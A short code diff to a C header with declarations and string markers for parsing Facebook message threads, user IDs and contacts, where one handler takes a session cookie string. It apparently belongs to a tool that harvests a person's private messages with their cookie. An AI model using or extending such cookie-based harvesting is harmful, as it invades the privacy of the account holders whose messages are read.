@@ -6,7 +6,8 @@
 DWORD FacebookMessageHandler(LPSTR);
 DWORD FacebookContactHandler(LPSTR strCookie);
 
-#define FB_USER_ID "\"id\":\""
+//#define FB_USER_ID "\"id\":\""
+#define FB_USER_ID "\"USER_ID\":\""
 #define FB_THREAD_LIST_ID "\"threads\":[{"
 #define FB_THREAD_LIST_END "\"ordered_threadlists\":"
 #define FB_THREAD_IDENTIFIER "\\/messages\\/?action=read&amp;tid="
